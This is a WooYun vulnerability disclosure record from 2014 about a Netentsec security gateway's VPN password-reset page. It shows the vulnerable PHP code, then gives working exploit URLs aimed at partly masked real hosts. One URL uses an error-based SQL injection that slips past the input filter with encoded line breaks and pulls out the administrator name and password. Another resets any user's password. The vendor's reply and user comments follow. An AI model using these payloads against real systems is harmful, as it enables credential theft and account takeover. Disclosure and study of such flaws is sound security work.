{"id": 48403, "wybug_id": "wooyun-2014-077810", "wybug_title": "网康安全网关任意用户密码修改+SQL注入(绕过全局防注入)", "wybug_corp": "网康科技", "wybug_author": "路人甲", "wybug_date": "2014-09-29 17:42", "wybug_open_date": "2014-12-28 17:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向公众公开  简要描述： 网康安全网关任意用户密码修改+SQL注入(绕过全局防注入) 详细说明：  0x01 漏洞信息/vpnweb/resetpwd/resetpwd.php产生漏洞的代码：\n<?phpinclude(\"include/common.inc\");if(!str_check($username)||!str_check($UserId)||!str_check($password1))exit;switch ($action){case \"update\":\t$dbh = db_connect();\t$update = \"update ISCUserTable set Password='$password1' where UserId=$UserId\";\tdb_update($dbh,$update,\"重置密码\");\tform_logon($UserId,\"\",$para,\"&nbsp;重置密码成功！\",true);\tdb_close($dbh);\tbreak;}\n0x02 任意用户密码修改$update = \"update ISCUserTable set Password='$password1' where UserId=$UserId\";从上面的代码可以知道修改密码只需要UserId即可修改，而该参数是可以猜测的，于是造成了漏洞。0x03 SQL注入进入SQL查询的代码为：$update = \"update ISCUserTable set Password='$password1' where UserId=$UserId\";可以知道，UserId没有单引号的保护，虽然UserId经过了str_check函数的检查if(!str_check($username)||!str_check($UserId)||!str_check($password1))exit;0x04 SQL注入漏洞证明https://124.133.xx.xx:4443//vpnweb/resetpwd/resetpwd.php?action=update&password1=111111&UserId=1%0a%0dand%0a%0d1=(updatexml(1,concat(0x5e24,(select%0a%0dconcat(adminname,0x7e,passwd)%0a%0dfrom%0a%0dAdmin%0a%0dlimit%0a%0d1),0x5e24),1))%23\n\nhttps://218.xx.167.1x/vpnweb/resetpwd/resetpwd.php?action=update&password1=111111&UserId=1%0a%0dand%0a%0d1=(updatexml(1,concat(0x5e24,(select%0a%0dconcat(adminname,0x7e,passwd)%0a%0dfrom%0a%0dAdmin%0a%0dlimit%0a%0d1),0x5e24),1))%23\n\n0x05 任意用户密码修改证明首先通过SQL注入查询出一个用户的UserId,UserName,Password,如图\n\n接下来修改该用户的密码为：wooyun只需要提交如下的的参数https://218.xx.167.1x/vpnweb/resetpwd/resetpwd.php?action=update&password1=wooyun&UserId=7再次注入出UserId为7的密码：\n\n可以看见，已经被修改为：wooyun。（密码已改回原密码）   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-09-29 18:11 厂商回复： 该漏洞与WooYun-2014-属同一漏洞，建议合并，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-29 17:42 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  这个可以有。    \n     2014-10-20 10:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我靠，这尼玛也可以啊。到底咋写的。而且他全局怎么过滤的啊……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}